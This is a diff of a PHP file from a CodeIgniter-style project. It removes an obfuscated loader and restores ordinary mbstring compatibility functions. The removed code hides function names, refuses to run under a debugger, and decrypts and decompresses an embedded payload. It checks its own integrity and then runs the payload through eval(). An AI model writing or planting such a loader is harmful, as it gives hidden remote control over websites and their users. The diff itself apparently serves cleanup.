@@ -1,28 +1,138 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_lq8kxd2d=('bas'.'e64'.'_de'.'cod'.'e');
-$_swv4gs98=('gzu'.'nco'.'mpr'.'ess');
-$_dc1wdxir=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_in7ewm14='a8lODA61';
-$_zhizc0th='1r2WdP0qCXE=';
-$_i8j5ngqs='3M6H6wSh';
-$_oci00xqp='dnFRzPFk';
-$_zqmcrdnw='OHkQoW7C';
-$_q6cb0om9='KYm8ZCNh';
-$_uz5senat='D7272JR6';
-$_di6m64a8='Lg/lzQ==';
-$_drs97fa1=$_lq8kxd2d($_i8j5ngqs.$_oci00xqp.$_zqmcrdnw.$_in7ewm14.$_zhizc0th);
-$_lo909r2l=$_lq8kxd2d($_q6cb0om9.$_uz5senat.$_di6m64a8);
-$_xl0msh9r=$_lq8kxd2d('Ypt7qpII2VV+EeVn+TSUQ0Bi5hTed+hTYFdcAao/V+5uukP6LVSETbJrRgDsK9p0/SoIH3tJ8Bc67iX6sBiyvBVuLg3PICUTlYyTvwmw82EVhEnegThhaQS0BQsVFGfBUZzYll/52nvJ1eLbKbTgb1fs43f7bSLXkFzhG3ezO15A8fI7bru3bicLH/bWvQZF5UHKdbH2fRcS09/Zw3spURyXEDq512J1hbopQXf88zz3Sfl/ZyrKge4IZq+frVm5tYJr8gqTWDdnBRYlwMOivXcIRlYLoRTSkeDXByoD+Vfh0ioXRnMSB6oOg95FKyM9BThwxz3bs7LHd3GdmiqrWmhNa2ljMWiVKLMJFXLg8/wJiUpG+Rb0N0OjtPxygg+1fEBHkWaGgc5Cno7VNjjujLfBiopIxckcGo6SeHVmiQ5qJl0c2WDKs16wnFok/8+exyGpsPThvEaoxbKKVuSmvSd0e5WkfPw2CQNQfli0dTVqKQAaziU4YlBtxuPMpRICpLzRQnmKS1u7tn1aI6sF8F3/Djp2/XGsagQ1wSxOatRrh3sTPjZEHg3BDEQcGTRJ');
-$_ro0zf90e=$_dc1wdxir($_xl0msh9r,'aes-256-cbc',$_drs97fa1,OPENSSL_RAW_DATA,$_lo909r2l);
-if($_ro0zf90e===false){exit;}
-$_y6i98abo=$_swv4gs98($_ro0zf90e);
-if($_y6i98abo===false){exit;}
-$_yoa6vn0l='5c119c214ddd4ccb2d38ae29e55d7d1487c1a846bb4a369d5b85c566b6358c50';
-$_c3x8iz97=@file_get_contents(__FILE__);
-if($_c3x8iz97!==false){
-$_r25ksf1u=str_replace($_yoa6vn0l,"0000000000000000000000000000000000000000000000000000000000000000",$_c3x8iz97);
-$_yzalozxs=hash("sha256",$_r25ksf1u);
-if($_yzalozxs!==$_yoa6vn0l){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+if (MB_ENABLED === TRUE)
+{
+return;
 }
-eval($_y6i98abo);
+
+if ( ! function_exists('mb_strlen'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function mb_strlen($str, $encoding = NULL)
+{
+if (ICONV_ENABLED === TRUE)
+{
+return iconv_strlen($str, isset($encoding) ? $encoding : config_item('charset'));
+}
+log_message('debug', 'Compatibility (mbstring): iconv_strlen() is not available, falling back to strlen().');
+return strlen($str);
+}
+}
+
+if ( ! function_exists('mb_strpos'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+function mb_strpos($haystack, $needle, $offset = 0, $encoding = NULL)
+{
+if (ICONV_ENABLED === TRUE)
+{
+return iconv_strpos($haystack, $needle, $offset, isset($encoding) ? $encoding : config_item('charset'));
+}
+log_message('debug', 'Compatibility (mbstring): iconv_strpos() is not available, falling back to strpos().');
+return strpos($haystack, $needle, $offset);
+}
+}
+
+if ( ! function_exists('mb_substr'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+function mb_substr($str, $start, $length = NULL, $encoding = NULL)
+{
+if (ICONV_ENABLED === TRUE)
+{
+isset($encoding) OR $encoding = config_item('charset');
+return iconv_substr(
+$str,
+$start,
+isset($length) ? $length : iconv_strlen($str, $encoding), 
+$encoding
+);
+}
+log_message('debug', 'Compatibility (mbstring): iconv_substr() is not available, falling back to substr().');
+return isset($length)
+? substr($str, $start, $length)
+: substr($str, $start);
+}
+}
